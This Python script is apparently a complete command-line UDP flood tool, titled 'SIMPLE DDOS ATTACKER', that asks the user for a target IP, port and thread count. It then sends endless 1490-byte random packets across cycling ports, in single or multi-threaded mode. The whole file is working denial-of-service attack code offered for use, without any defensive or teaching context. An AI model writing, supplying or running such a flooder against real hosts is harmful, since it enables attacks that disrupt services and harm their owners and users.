import os
import time
import string
import random
import socket
import pyfiglet
import threading
from rich import print
from rich.prompt import Prompt, Confirm

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def mainMenu():
	if os.name in ("nt", "dos"):
		os.system("cls")
	else:
		os.system("clear")
	title = pyfiglet.figlet_format("SIMPLE DDOS ATTACKER", font="slant")
	print(f'[cyan]{title}[/cyan]')
	print("    ")
	print("[cyan][>][/cyan] GitHub: [cyan]https://www.github.com/dincertekin[/cyan]")
	print("    ")
	ipAddress = Prompt.ask("[cyan][?][/cyan] Enter an IP Address:\n[cyan][>][/cyan]", show_choices=False, show_default=False)
	print("[cyan][!][/cyan] IP Address parameter set to [green]{0}[/green].".format(str(ipAddress)))
	port = Prompt.ask("[cyan][?][/cyan] Enter an Port:\n[cyan][>][/cyan]", show_choices=False, show_default=False)
	print("[cyan][!][/cyan] Port parameter set to [green]{0}[/green].".format(str(port)))
	packetCount = Prompt.ask("[cyan][?][/cyan] How many packets to send? (Default [green]50000[/green]):\n[cyan][>][/cyan]", show_choices=False, show_default=False)
	print("[cyan][!][/cyan] Packets parameter set to [green]{0}[/green].".format(str(packetCount)))
	multiThreading = Prompt.ask("[cyan][?][/cyan] Multi-threading enabled?: [cyan][Y/N][/cyan]\n[cyan][>][/cyan]", show_choices=False, show_default=False)
	if multiThreading.upper() == 'Y':
		print("[cyan][!][/cyan] Multi-threading parameter set to [green]{0}[/green].".format(str("true")))
		threadCount = Prompt.ask("[cyan][?][/cyan] How many threads for multi-threading? (Default [green]10[/green]): [cyan][Y/N][/cyan]\n[cyan][>][/cyan]", show_choices=False, show_default=False)
		startAttack(target_ip=str(ipAddress), port=int(port), packet_count=int(packetCount), multi_thread=True, thread_count=int(threadCount))
	else:
		print("[cyan][!][/cyan] Multi-threading parameter set to [red]{0}[/red].".format(str("false")))
		startAttack(target_ip=str(ipAddress), port=int(port), multi_thread=False)

def startAttack(target_ip, port, packet_count=50000, multi_thread=False, thread_count=10):
	if multi_thread == True:
		print("[cyan][>][/cyan] Attack will start in [cyan]15 seconds[/cyan], if you want to stop it press [grey62]CTRL+C[/grey62]!")
		time.sleep(15)

		def send_packets(target_ip=target_ip, port=port):
			global sock, bytes
			sent = 0
			while True:
				try:
					sock.sendto(bytes, (target_ip, port))
					sent = sent + 1
					port = port + 1
					print("[cyan][>][/cyan] Sent {0} packet to {1} throught port: {2}".format(sent, target_ip, port))
					if port == 65534:
						port = 1
				except Exception as e:
					print("[red][Error]:[/red] ", e)

		threads = [threading.Thread(target=send_packets) for i in range(thread_count)]
		for t in threads:
			t.start()
		for t in threads:
			t.join()
	else:
		print("[cyan][>][/cyan] Attack will start in [cyan]15 seconds[/cyan], if you want to stop it press [grey62]CTRL+C[/grey62]!")
		time.sleep(15)
		global sock, bytes
		sent = 0
		while True:
			try:
				sock.sendto(bytes, (target_ip, port))
				sent = sent + 1
				port = port + 1
				print("[cyan][>][/cyan] Sent {0} packet to {1} throught port: {2}".format(sent, target_ip, port))
				if port == 65534:
					port = 1
			except Exception as e:
				print("[red][Error]:[/red] ", e)

mainMenu()
